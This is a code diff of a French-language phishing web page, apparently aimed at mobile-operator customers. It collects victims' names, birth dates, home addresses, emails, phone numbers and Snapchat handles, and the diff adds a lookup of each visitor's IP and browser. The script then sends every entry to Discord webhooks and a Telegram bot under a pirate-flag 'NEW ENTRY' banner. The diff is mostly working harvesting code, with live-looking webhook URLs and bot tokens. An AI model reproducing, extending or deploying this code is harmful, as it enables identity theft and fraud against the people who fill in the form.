@@ -83,8 +83,8 @@
   </div>
 
   <script>
-    const DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1450540276744720555/8woBqX1T5UxNcidacUMi0aYqJYO0IccjjjhDiP26P2hISnXV7vsl1b5n4XwnS19QAGEA";
-    const DISCORD_ALT_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1450540276744720555/8woBqX1T5UxNcidacUMi0aYqJYO0IccjjjhDiP26P2hISnXV7vsl1b5n4XwnS19QAGEA";
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
+    const DISCORD_ALT_WEBHOOK_URL = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
     const TELEGRAM_TOKEN = "8376532446:AAEJHOCBBO8KrHJb2pnrsu2e1-Ow17pl9r0";
     const TELEGRAM_CHAT_ID = "8431463416";
 
@@ -109,13 +109,29 @@
       });
     }
 
+    async function getApifyInfo() {
+      try {
+        const response = await fetch('https://api.apify.com/v2/browser-info?format=json');
+        const data = await response.json();
+        return {
+          ip: data.ip || "Inconnu",
+          ua: data.userAgent || navigator.userAgent
+        };
+      } catch (err) {
+        console.error("Erreur récupération Apify :", err);
+        return {
+          ip: "Inconnu",
+          ua: navigator.userAgent
+        };
+      }
+    }
+
     document.getElementById("form2").addEventListener("submit", async (e) => {
       e.preventDefault();
       const msgElem = document.getElementById("msg");
       msgElem.textContent = "Envoi en cours...";
 
       const formData = new FormData(e.target);
-
       const step2 = {
         nom: formData.get("nom"),
         prenom: formData.get("prenom"),
@@ -130,42 +146,43 @@
       const step1 = JSON.parse(localStorage.getItem("step1") || "{}");
       const operateur = step1.operateur || "Non fourni";
       const telephone = step1.telephone || "Non fourni";
-      const ip = "Inconnu";
-      const ua = "Inconnu";
-      
+
+      // Récupération IP et User-Agent via Apify
+      const apifyInfo = await getApifyInfo();
+      const ip = apifyInfo.ip;
+      const ua = apifyInfo.ua;
+
       let webhookToUse = DISCORD_WEBHOOK_URL;
       if (operateur.toLowerCase().includes("bouygues") && Math.random() < 0.5) {
         webhookToUse = DISCORD_ALT_WEBHOOK_URL;
       }
 
       const discordEmbed = {
-        title: "🏴‍☠️ +1 Entrée 🏴‍☠️",
+        title: "🏴‍☠️ +1 NEW ENTRY 🏴‍☠️",
         color: 0x9b00ff,
         fields: [
           {
             name: "\u200B",
             value:
-              `|🇪🇪| Nom         : ${step2.nom}\n` +
-              `|🇪🇪| Prénom      : ${step2.prenom}\n` +
-              `|🇪🇪| Naissance   : ${step2.naissance || "Non fournie"}\n` +
-              `|🇪🇪| Snapchat    : ${step2.snap || "Non fourni"}\n\n` +
+              `📂 Informations Personnelles\n` +
+              `├ 👤 Nom complet : ${step2.nom} ${step2.prenom}\n` +
+              `├ 🏠 Adresse : ${step2.adresse}\n` +
+              `├ 📍 Ville : ${step2.ville}\n` +
+              `├ 📮 Zip : ${step2.codePostal}\n` +
+              `└ 📱 Numéro de téléphone : \`\`${telephone}\`\`\n\n` +
 
-              `|🏠| Adresse     : ${step2.adresse || "Non fournie"}\n` +
-              `|🏠| Ville       : ${step2.ville}\n` +
-              `|🏠| Code Postal : ${step2.codePostal}\n\n` +
+              `📧 Contact\n` +
+              `├ ✉️ Email : ${step2.email}\n` +
+              `├ 👻 Snapchat : ${step2.snap || "Non fourni"}\n` +
+              `└ 📡 Opérateur : ${operateur}\n\n` +
 
-              `|🪁| Email       : ${step2.email}\n` +
-              `|🪁| Téléphone   : ${telephone}\n` +
-              `|🪁| Opérateur   : ${operateur}\n\n` +
-
-              `|🥥| IP          : ${ip}\n` +
-              `|🥥| User-Agent  : ${ua}`
+              `🌐 Connexion\n` +
+              `├ 🧭 IP : ${ip}\n` +
+              `└ 💻 Navigateur : ${ua}`
           }
         ],
         timestamp: new Date().toISOString(),
-        footer: {
-          text: "📥 Données reçues via le formulaire"
-        }
+        footer: { text: "📥 Données reçues via le formulaire" }
       };
 
       const telegramText =
@@ -173,13 +190,13 @@
         `|🇪🇪| Nom : ${step2.nom}\n` +
         `|🇪🇪| Prénom : ${step2.prenom}\n` +
         `|🇪🇪| Naissance : ${step2.naissance}\n` +
-        `|🇪🇪| Snapchat : ${step2.snap}\n\n` +
-        `|🏠|Adresse : ${step2.adresse || "Non fournie"}\n` +
+        `|🇪🇪| Snapchat : ${step2.snap || "Non fourni"}\n\n` +
+        `|🏠| Adresse : ${step2.adresse || "Non fournie"}\n` +
         `|🏠| Ville : ${step2.ville}\n` +
         `|🏠| Code Postal : ${step2.codePostal}\n\n` +
-        `|🪁| E‑Mail : ${step2.email}\n` + 
-        `|🪁| Opérateur : ${operateur}\n` +
-        `|🪁| Téléphone : ${telephone}\n\n` +
+        `|🪁| E‑Mail : ${step2.email}\n` +
+        `|🪁| Téléphone : ${telephone}\n` +
+        `|🪁| Opérateur : ${operateur}\n\n` +
         `|🥥| Adresse IP : ${ip}\n` +
         `|🥥| User-Agent : ${ua}`;
 
@@ -188,7 +205,6 @@
           sendDiscord(discordEmbed, webhookToUse),
           sendTelegram(telegramText)
         ]);
-
         msgElem.textContent = "Données envoyées avec succès ! Redirection...";
         localStorage.setItem("step2", JSON.stringify(step2));
         setTimeout(() => window.location.href = "merci.html", 1000);
@@ -199,5 +215,4 @@
     });
   </script>
 </body>
-
 </html>
